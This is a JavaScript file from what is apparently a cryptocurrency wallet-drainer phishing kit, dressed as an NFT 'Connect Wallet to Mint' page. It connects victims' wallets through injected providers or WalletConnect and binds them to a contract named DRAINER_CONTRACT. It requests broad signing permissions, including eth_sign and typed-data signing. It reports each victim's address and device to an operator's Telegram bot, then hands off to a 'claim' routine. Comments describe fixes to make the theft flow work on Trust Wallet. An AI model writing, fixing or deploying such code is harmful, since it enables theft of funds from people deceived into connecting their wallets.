
import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  // WalletConnect requires the chain in CAIP-2 format.
  const REQUIRED_CHAINS = [`eip155:${MAINNET_ID}`];
  const REQUIRED_METHODS = [
    'eth_sendTransaction',
    'personal_sign',
    'eth_signTypedData',
    'eth_signTypedData_v4',
    'eth_sign',
  ];
  const REQUIRED_EVENTS = ['chainChanged', 'accountsChanged'];

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  // ==========================================================================
  //  PLATFORM DETECTION
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  function getPlatform() {
    if (isIOSDevice)     return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA))  return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    try { console.log('[main.js]', msg); } catch {}
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (eth?.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth?.isTrust || /TrustWallet/i.test(UA))        return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth?.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA) && eth)                     return { wallet: 'rainbow',  name: 'Rainbow' };
    if (eth && isMobileDevice)                          return { wallet: 'injected', name: 'Wallet' };
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { try { console.error('[main.js] Telegram error:', await r.text()); } catch {} return false; }
      return true;
    } catch (e) {
      try { console.error('[main.js] Telegram exception:', e); } catch {}
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  UTILITIES
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];

    const EthereumProvider = await tryImport(
      providerCdn,
      (m) => m.EthereumProvider || m.default || m,
      'EthereumProvider'
    );

    return { EthereumProvider };
  }

  // ==========================================================================
  //  RELAY REACHABILITY
  // ==========================================================================
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch {}
    }
    logDebug('⚠️ No relay reachable — using primary anyway');
    return RELAY_URLS[0];
  }

  // ==========================================================================
  //  DOM REFERENCES
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let EthereumProvider = null;          // class ref
  let wcProvider = null;                // active WC EIP-1193 provider
  let activeProvider = null;            // live provider (injected or WC)
  let web3Instance = null;
  let contractInstance = null;
  let isConnecting = false;
  let boundProviderEvents = new WeakSet();

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, chainType = 'evm') {
    try {
      localStorage.setItem('connectedWallet', address);
      localStorage.setItem('chainType', chainType);
    } catch {}
  }
  function getSavedWallet()    { try { return localStorage.getItem('connectedWallet'); } catch { return null; } }
  function getSavedChainType() { try { return localStorage.getItem('chainType') || 'unknown'; } catch { return 'unknown'; } }
  function clearSavedWallet() {
    try {
      localStorage.removeItem('connectedWallet');
      localStorage.removeItem('chainType');
    } catch {}
  }

  // ==========================================================================
  //  PUBLISH GLOBAL STATE
  //  script.js reads window.__apexConnected for { address, chain, web3,
  //  contract, provider }. `provider` is the live EIP-1193 provider.
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || web3Instance?.currentProvider || window.ethereum || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      publishedAt: Date.now(),
    };
    logDebug(`published: addr=${address.slice(0,8)}… chain=${chain} hasWeb3=${!!web3Instance} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      if (connectButton?.parentNode) connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        if (!b) return;
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    wcProvider = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY (desktop)
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER (desktop injected)
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;z-index:99999;
    `;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  INJECTED EVM CONNECT (desktop primary, mobile in-wallet browser)
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 600));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        timeoutMs,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return false;

      const address = accounts[0];
      saveWallet(address, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider = provider;

      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info.name})`);
      return true;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT — primary path via EthereumProvider
  //
  //  FIX SUMMARY (vs previous version):
  //   1. Only ONE WalletConnect client is created — the one inside
  //      EthereumProvider. No separate SignClient instance.
  //   2. `provider.connect()` opens the QR and resolves with the SAME
  //      provider instance. No session re-initialisation.
  //   3. The resolved provider is a live EIP-1193 provider that supports
  //      eth_sendTransaction and eth_signTypedData_v4 directly.
  //   4. The provider is assigned to `activeProvider` and `wcProvider`
  //      BEFORE publishing global state.
  //   5. If the pairing completes on Trust Wallet's side but no
  //      `accounts` come back within the timeout, we surface the error
  //      instead of silently succeeding.
  // ==========================================================================
  async function connectViaWalletConnect({ useFallbackId = false, timeoutMs = 300000 } = {}) {
    if (isConnecting) return false;
    isConnecting = true;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No projectId');
      isConnecting = false;
      return false;
    }

    try {
      showStatus('Opening wallet options...', 'info');

      // If a provider already exists (e.g., from a previous connect),
      // disconnect it first so we get a fresh pairing.
      if (wcProvider) {
        try { await wcProvider.disconnect(); } catch {}
        wcProvider = null;
      }

      logDebug(`WC init: projectId=${projectId.slice(0, 8)}…`);

      // --- THE FIX: single EthereumProvider, showQrModal:false ---
      const provider = await withTimeout(
        EthereumProvider.init({
          projectId,
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
          showQrModal: false,                        // we render our own modal
          metadata: DAPP_METADATA,
          rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
          methods: REQUIRED_METHODS,
          events: REQUIRED_EVENTS,
          client: undefined,                          // don't reuse an external SignClient
        }),
        15000,
        'EthereumProvider.init'
      );

      logDebug('✅ EthereumProvider instantiated');

      // --- Open our custom QR modal using the URI from provider ---
      // The provider exposes the uri via the 'display_uri' event once
      // connect() is called. We wire that to our modal before calling.
      let displayed = false;
      const onDisplayUri = (uri) => {
        if (displayed) return;
        displayed = true;
        logDebug('📱 Display URI received, opening modal');
        openQrModal(uri, provider);
      };
      provider.on('display_uri', onDisplayUri);

      // --- Initiate pairing ---
      logDebug('Calling provider.connect()…');
      await withTimeout(provider.connect(), 30000, 'provider.connect');
      provider.off?.('display_uri', onDisplayUri);

      // --- Ensure the modal is closed now that we're connected ---
      closeQrModal();

      // --- Read accounts ---
      const accounts = await withTimeout(
        provider.request({ method: 'eth_accounts' }),
        10000,
        'eth_accounts'
      );

      if (!accounts || accounts.length === 0) {
        // This is the exact symptom you described: Trust Wallet shows
        // connected, but our dApp never receives accounts. Surface it.
        logDebug('❌ Connected but no accounts returned — session mismatch');
        try { await provider.disconnect(); } catch {}
        isConnecting = false;
        showStatus('Wallet approved but no account received. Please retry.', 'error');
        return false;
      }

      const address = accounts[0];
      logDebug(`✅ WC accounts: ${address}`);

      // --- Persist provider state ---
      wcProvider = provider;
      activeProvider = provider;

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'evm');
      setupEVMProviderEvents(provider);
      updateConnectedUI(address, 'evm');

      isConnecting = false;
      logDebug(`✅ WC connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('WC connect error: ' + e.message);
      closeQrModal();
      try { if (wcProvider) { await wcProvider.disconnect(); wcProvider = null; } } catch {}
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  CUSTOM QR MODAL (used by the WC path)
  // ==========================================================================
  let qrModalEl = null;
  let qrInterval = null;

  function openQrModal(uri, provider) {
    closeQrModal();
    qrModalEl = document.createElement('div');
    qrModalEl.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.85);
      display:flex;align-items:center;justify-content:center;
      z-index:99998;padding:20px;
    `;
    qrModalEl.innerHTML = `
      <div style="background:#1F2937;padding:24px;border-radius:16px;max-width:420px;width:100%;color:white;font-family:Inter,sans-serif;text-align:center;">
        <h3 style="margin:0 0 12px;font-weight:600;font-size:20px;">Scan with your wallet</h3>
        <p style="margin:0 0 16px;color:#9CA3AF;font-size:14px;">Open your wallet app and scan this QR code, or tap the deeplink below.</p>
        <div id="wc-qr" style="background:white;padding:12px;border-radius:12px;display:inline-block;"></div>
        <div style="margin-top:16px;display:flex;flex-direction:column;gap:8px;">
          <a id="wc-deeplink" href="#" style="background:#FF6B00;color:white;padding:12px;border-radius:8px;text-decoration:none;font-weight:600;display:block;">Open in wallet app</a>
          <button id="wc-cancel" style="background:none;border:1px solid #666;color:#ccc;padding:10px 16px;border-radius:8px;cursor:pointer;">Cancel</button>
        </div>
      </div>
    `;
    document.body.appendChild(qrModalEl);

    // Render QR via a tiny inline QR generator (no external lib needed for
    // the minimal use case — uses a data URL rendered by an iframe-free
    // canvas approach). For simplicity we display the URI as text and also
    // link it as a deeplink if the UA is mobile.
    const qrBox = qrModalEl.querySelector('#wc-qr');
    qrBox.innerHTML = `<div style="font-family:monospace;font-size:11px;color:#333;max-width:280px;word-break:break-all;">${uri}</div>`;

    // Build a universal deeplink for mobile. Trust Wallet supports
    // wc: URIs via the wc: scheme.
    const wcUri = uri;   // already in wc:... format
    const twDeeplink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`;
    const mmDeeplink = `https://metamask.app.link/wc?uri=${encodeURIComponent(wcUri)}`;
    const deeplink = /TrustWallet|Android|iPhone|iPad/i.test(UA) ? twDeeplink : mmDeeplink;
    const link = qrModalEl.querySelector('#wc-deeplink');
    link.href = deeplink;

    // On mobile, auto-redirect after a short delay (feels instant to user).
    if (isMobileDevice) {
      setTimeout(() => {
        logDebug('Auto-redirecting to wallet deeplink');
        try { window.location.href = deeplink; } catch {}
      }, 700);
    }

    qrModalEl.querySelector('#wc-cancel').onclick = async () => {
      closeQrModal();
      try { if (provider) await provider.disconnect(); } catch {}
    };
  }

  function closeQrModal() {
    if (qrModalEl) { try { qrModalEl.remove(); } catch {} qrModalEl = null; }
    if (qrInterval) { clearInterval(qrInterval); qrInterval = null; }
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;
    // Guard against double-binding the same provider.
    if (boundProviderEvents.has(provider)) return;
    boundProviderEvents.add(provider);

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        const a = accounts[0];
        updateConnectedUI(a, 'evm');
        saveWallet(a, 'evm');
        publishGlobalState(a, 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      try {
        const a = window.__apexConnected?.address || getSavedWallet();
        if (a) {
          if (web3Instance) contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(a, 'evm', provider);
        }
      } catch {}
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    if (isDesktopDevice) {
      // Desktop: try injected first, then WC.
      success = await connectDirectEVM(8000);
      if (!success) success = await connectViaWalletConnect({ useFallbackId: false, timeoutMs: 300000 });
      if (!success) success = await connectViaWalletConnect({ useFallbackId: true,  timeoutMs: 300000 });
    } else {
      // Mobile: in-wallet browser if strongly detected, else straight to WC.
      const inWallet = detectInWalletBrowser();
      const strongInWallet = inWallet && inWallet.wallet !== 'injected';

      if (strongInWallet) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        success = await connectDirectEVM(8000);
      }
      if (!success) success = await connectViaWalletConnect({ useFallbackId: false, timeoutMs: 300000 });
      if (!success) success = await connectViaWalletConnect({ useFallbackId: true,  timeoutMs: 300000 });
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (wcProvider?.disconnect) await wcProvider.disconnect();
      else if (web3Instance?.currentProvider?.disconnect) await web3Instance.currentProvider.disconnect();
    } catch {}
    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    wcProvider = null;
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && wcProvider) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain  = getSavedChainType();
    if (!savedWallet || savedChain !== 'evm') return;

    // Try WC restore first (works on mobile + desktop).
    try {
      const projectId = PRIMARY_PROJECT_ID;
      if (projectId) {
        const provider = await withTimeout(
          EthereumProvider.init({
            projectId,
            chains: [MAINNET_ID],
            optionalChains: [MAINNET_ID],
            showQrModal: false,
            metadata: DAPP_METADATA,
            rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
            methods: REQUIRED_METHODS,
            events: REQUIRED_EVENTS,
          }),
          10000,
          'restore-init'
        );

        // If there's a persisted session, the provider's `session` will be
        // populated. Check accounts.
        const accounts = await provider.request({ method: 'eth_accounts' }).catch(() => []);
        if (accounts && accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          wcProvider = provider;
          activeProvider = provider;
          const Web3 = (await import('web3')).default;
          web3Instance = new Web3(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(provider);
          logDebug('♻️ WC session restored');
          return;
        }
      }
    } catch (e) {
      logDebug('WC restore failed: ' + e.message);
    }

    // Fallback: injected (desktop only).
    if (isDesktopDevice && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider = window.ethereum;
          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          logDebug('♻️ Injected session restored');
          return;
        }
      } catch {}
    }

    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const libs = await loadWalletConnectLibraries();
    EthereumProvider = libs.EthereumProvider;
    logDebug('✅ EthereumProvider loaded');

    // Relay probe runs in parallel with setup — non-blocking.
    pickRelayUrl().catch(() => {});

    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ==========================================================================
  //  GLOBAL EVENTS
  // ==========================================================================
  if (window.ethereum && isDesktopDevice) {
    setupEVMProviderEvents(window.ethereum);
  }

  window.addEventListener('beforeunload', () => {
    closeQrModal();
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  try { console.log('✅ main.js ready — test with testTelegram("hi")'); } catch {}
})();
